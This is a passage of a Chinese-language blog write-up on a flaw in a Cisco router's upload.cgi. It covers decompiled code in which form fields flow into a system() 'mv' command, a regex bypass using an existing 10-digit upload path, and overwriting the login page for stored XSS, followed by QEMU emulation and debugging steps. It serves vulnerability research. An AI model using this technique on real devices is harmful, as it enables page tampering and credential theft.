&amp;haystack, <span class="string">&quot;\&quot;filename\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v30, <span class="string">&quot;\&quot;pathparam\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v31, <span class="string">&quot;\&quot;fileparam\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v32, <span class="string">&quot;\&quot;destination\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v33, <span class="string">&quot;\&quot;option\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v34, <span class="string">&quot;\&quot;cert_name\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v35, <span class="string">&quot;\&quot;cert_type\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v36, <span class="string">&quot;\&quot;password\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HTTP_COOKIE_addr )</span><br><span class="line">    <span class="built_in">get_strtok_value</span>(HTTP_COOKIE_addr, <span class="string">&quot;sessionid=&quot;</span>, <span class="string">&quot;;&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( !v29 || <span class="built_in">match_regex</span>(<span class="string">&quot;^/tmp/upload/[0-9]&#123;10&#125;$&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error Input&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">StrBufSetStr</span>(v39, v31);</span><br><span class="line">  v14 = haystack;</span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;.xml&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="string">&quot;Configuration&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v14, <span class="string">&quot;.img&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">StrBufSetStr</span>(v39, v14);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      v15 = <span class="string">&quot;Firmware&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = v15;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_18:</span><br><span class="line">  v16 = v29;</span><br><span class="line">  v17 = (<span class="type">int</span>)v30;</span><br><span class="line">  v18 = <span class="built_in">StrBufToStr</span>(v39);</span><br><span class="line">  v19 = <span class="built_in">sub_115EC</span>(v17, v16, v18);</span><br><span class="line">  <span class="keyword">if</span> ( v19 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error Input&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">        v26 = <span class="string">&quot;Configure upload fail&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">        v26 = <span class="string">&quot;The length of filename is greater than 128&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">        v26 = <span class="string">&quot;The filename is illegal, only support &#x27;a-z&#x27; &#x27;A-Z&#x27; &#x27;0-9&#x27; &#x27;_&#x27; &#x27;.&#x27; &#x27;-&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(v26);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(REQUEST_URI_addr, <span class="string">&quot;/api/operations/ciscosb-file:form-file-upload&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (<span class="type">int</span>)v30;</span><br><span class="line">    v21 = <span class="built_in">StrBufToStr</span>(v39);</span><br><span class="line">    <span class="built_in">sub_125A8</span>(s, v20, v21, v29);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(REQUEST_URI_addr, <span class="string">&quot;/upload&quot;</span>) &amp;&amp; !<span class="built_in">match_regex</span>(<span class="string">&quot;^[A-Fa-f0-9]&#123;64&#125;$&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = v32;</span><br><span class="line">    v23 = v33;</span><br><span class="line">    v24 = (<span class="type">int</span>)v30;</span><br><span class="line">    v25 = <span class="built_in">StrBufToStr</span>(v39);</span><br><span class="line">    <span class="built_in">sub_1277C</span>(s, v22, v23, v24, v25, v34, v35, v36);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">  <span class="built_in">free</span>(v8);</span><br><span class="line">  <span class="built_in">StrBufFree</span>(&amp;v38);</span><br><span class="line">  <span class="built_in">StrBufFree</span>(&amp;boundary);</span><br><span class="line">  <span class="built_in">StrBufFree</span>(&amp;v39);</span><br><span class="line">  <span class="built_in">json_object_put</span>(dword_2348C);</span><br><span class="line">  <span class="built_in">SYSTEM</span>(<span class="string">&quot;rm -f %s/* &gt; /dev/null 2&gt;&amp;1&quot;</span>, <span class="string">&quot;/tmp/upload&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到大部分的信息都是没用的，让我们看漏洞函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_115EC</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">const</span> <span class="type">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">316</span>]; <span class="comment">// [sp+Ch] [bp-13Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a3 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    v3 = a1 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Firmware&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/firmware/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Configuration&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/configuration/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Certificate&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/in_certs/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Signature&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/signature/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;3g-4g-driver&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/3g-4g-driver/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Language-pack&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/language-pack/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;User&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/user/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(a1, <span class="string">&quot;Portal&quot;</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/www/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">is_file_exist</span>(a2) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a2) &gt; <span class="number">0x80</span> || <span class="built_in">strlen</span>(a3) &gt; <span class="number">0x80</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">match_regex</span>(<span class="string">&quot;^[a-zA-Z0-9_.-]*$&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;mv -f %s %s/%s&quot;</span>, a2, v8, a3);</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;cmd=%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( !s[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v9 = <span class="built_in">system</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v9 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">error</span>((<span class="type">int</span>)<span class="string">&quot;upload.cgi: %s(%d) Upload failed!&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;prepare_file&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)<span class="number">0xAD</span>);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会发现到最后会执行mv -f a2 v8&#x2F;a3</p><p>v8是通过判断a1来获得的，a2和a3分别都是参数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331149.png" alt="image-20240811153815824"></p><p>a2比较显然是通过file.path表单名称来匹配的</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331150.png" alt="image-20240811155117349"></p><p>a3会稍微复杂一点，filename表单的参数如果存在且不包含.img的话，那么a3就是filename表单下的参数，如果filename表单下为空的话，那么fileparam表单下的参数就是a3了，显然第二种方法控制比较简单</p><p>但是呢，如果只是到了这里，那么该漏洞也不会有任何的作用，可是呢</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331151.png" alt="image-20240811180710241"></p><p>在运行的时候会发现<code>/www/login.html</code>其实是软连接到<code>/tmp/www/login.html</code>的，因此只需要覆盖<code>/tmp/www/login.html</code>就能实现对登录页面的篡改，最终达到存储型XSS攻击的效果</p><p>但是还有一个问题</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331152.png" alt="image-20240811223418049"></p><p>此时该判定该如何跳过，接下来的动态调试也会解释这个问题</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>由于<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331153.png" alt="image-20240811212606929"></p><p>这一段过于的抽象，因此可以通过调试来观看整个进程</p><p>我准备采用的是fork子进程的方法，首先仿真成功之后，由于该程序是通过fork子进程然后再通过execvp来执行upload.cgi程序的，因此我们可以通过<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331154.png" alt="image-20240811212043909"></p><p>在程序的开始有个自己跳自己，那么该子进程就会一直在这里执行，同时在调试出错也可以重复进行，可以说是很方便的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331155.png" alt="image-20240811212337395"></p><p>然后使用gdbserver配合gdb进行调试，看到此时有个子进程，执行gdbserver附加进程</p><p>在主机执行sudo gdb-multiarch，一定要用sudo，因为之后要修改程序的机器码，如果不用root权限的话，因为是rx的所以会无法修改</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331156.png" alt="image-20240811205926274"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331157.png" alt="image-20240811211106460"></p><p>修改完成之后便是可以看到程序正常进行，同时还是从开头执行的</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331158.png" alt="image-20240811211745827"></p><p>由于我们的Post请求是</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331159.png" alt="image-20240811212926160"></p><p>所以这里的函数就是读取表单字段的内容存储在变量里</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331160.png" alt="image-20240811223809098"></p><p>看到上述的执行流走偏的情况，发现他正则匹配的对象是file.path的内容</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331161.png" alt="image-20240811224044862"></p><p>返回值为0，所以绕过了检查，但是这个函数是什么呢，很好奇</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331162.png" alt="image-20240811225228547"></p><p>发现只要是0-9内的10位数都可以绕过检查，也是很不错的</p><p>但是呢 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">is_file_exist</span>(a2) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-2</span>;</span><br></pre></td></tr></table></figure><p>要求是个存在的文件，因此在fork的时候看一眼</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331163.png" alt="image-20240811225528001"></p><p>所以只能是0000000001了，还是要反复匹配才是正确的</p><h1 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h1><p>在这里<a href="https://people.debian.org/~aurel32/qemu/armhf/">下载</a>，压缩的linux内核映像，文件系统和内核映像，arm结构要多下一个i开头的文件，涉及到更底层的知识了估计。</p><p>配置网络环境，运行以下脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#sudo ifconfig eth0 down                 # 首先关闭宿主机网卡接口</span></span><br><span class="line">sudo brctl addbr br0                     <span class="comment"># 添加一座名为 br0 的网桥</span></span><br><span class="line">sudo brctl addif br0 ens33                <span class="comment"># 在 br0 中添加一个接口</span></span><br><span class="line">sudo brctl stp br0 off                   <span class="comment"># 如果只有一个网桥，则关闭生成树协议</span></span><br><span class="line">sudo brctl setfd br0 1                   <span class="comment"># 设置 br0 的转发延迟</span></span><br><span class="line">sudo brctl sethello br0 1                <span class="comment"># 设置 br0 的 hello 时间</span></span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     <span class="comment"># 启用 br0 接口</span></span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    <span class="comment"># 启用网卡接口</span></span><br><span class="line">sudo dhclient br0                        <span class="comment"># 从 dhcp 服务器获得 br0 的 IP 地址</span></span><br><span class="line">sudo brctl show br0                      <span class="comment"># 查看虚拟网桥列表</span></span><br><span class="line">sudo brctl showstp br0                   <span class="comment"># 查看 br0 的各接口信息</span></span><br><span class="line">sudo tunctl -t tap0 -u root              <span class="comment"># 创建一个 tap0 接口，只允许 root 用户访问</span></span><br><span class="line">sudo brctl addif br0 tap0                <span class="comment"># 在虚拟网桥中增加一个 tap0 接口</span></span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    <span class="comment"># 启用 tap0 接口</span></span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure><p>之后运行 </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">  -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/mmcblk0p2&quot;</span> \</span><br><span class="line">  -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic -smp 4 </span><br></pre></td></tr></table></figure><p>该程序，但是我出了一个报错<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331164.png" alt="956b1a9956ce270fe8f2f05939a66989"></p><p>pulseaudio是音频设备，想来你也不需要用qemu机看电影，那么应该是没有什么影响的，把rootfs压缩好scp传上来</p><p>之后在机子里运行老几样建立隔离环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> -R 777 rootfs</span><br><span class="line"><span class="built_in">cd</span> rootfs/</span><br><span class="line">mount --<span class="built_in">bind</span> /proc proc</span><br><span class="line">mount --<span class="built_in">bind</span> /dev dev</span><br><span class="line"><span class="built_in">chroot</span> . /bin/sh</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/boot boot</span><br><span class="line">generate_default_cert</span><br><span class="line">/etc/init.d/confd start</span><br><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure><p>怎么来的呢，首先是执行nginx，发现无法访问http页面，就去依次修改报错</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># /etc/init.d/boot boot</span></span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">mount: mounting debugfs on /sys/kernel/debug failed: No such file or directory</span><br><span class="line">Mounting mnt partitions..mount: mounting /dev/mtdblock9 on /mnt/configcert failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock10 on /mnt/avcsign failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock11 on /mnt/webrootdb failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock12 on /mnt/license failed: No such device</span><br><span class="line"><span class="keyword">done</span>.</span><br><span class="line"><span class="built_in">cp</span>: can<span class="string">&#x27;t stat &#x27;</span>/etc/ssl/private/*<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/.KEYS_DIR_TMP/*&#x27;</span>: No such file or directory</span><br><span class="line">uci: Parse error (option/list <span class="built_in">command</span> found before the first section) at line 2492, byte 1</span><br><span class="line"> create_meta_data_xml begin</span><br><span class="line"> meta_data_gen_state: 0</span><br><span class="line"> meta_data_gen_state: 1</span><br><span class="line"> create_meta_data_xml end</span><br><span class="line">/ <span class="comment"># generate_default_cert</span></span><br><span class="line"><span class="built_in">touch</span>: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">/usr/bin/certscript: line 1: can<span class="string">&#x27;t create /tmp/stats/certstats.tmp: nonexistent directory</span></span><br><span class="line"><span class="string">perl: warning: Setting locale failed.</span></span><br><span class="line"><span class="string">perl: warning: Please check that your locale settings:</span></span><br><span class="line"><span class="string">LANGUAGE = (unset),</span></span><br><span class="line"><span class="string">LC_ALL = (unset),</span></span><br><span class="line"><span class="string">LANG = &quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="string">    are supported and installed on your system.</span></span><br><span class="line"><span class="string">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/stats/certstats.tmp&#x27;</span>: No such file or directory</span><br><span class="line">Default</span><br><span class="line">/ <span class="comment"># /etc/init.d/confd start</span></span><br><span class="line"></span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /avc-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /device-os-types --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /webfilter-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">0</span><br><span class="line">uci: Entry not found</span><br><span class="line">0</span><br><span class="line">uci: Entry not found</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span>: can<span class="string">&#x27;t remove 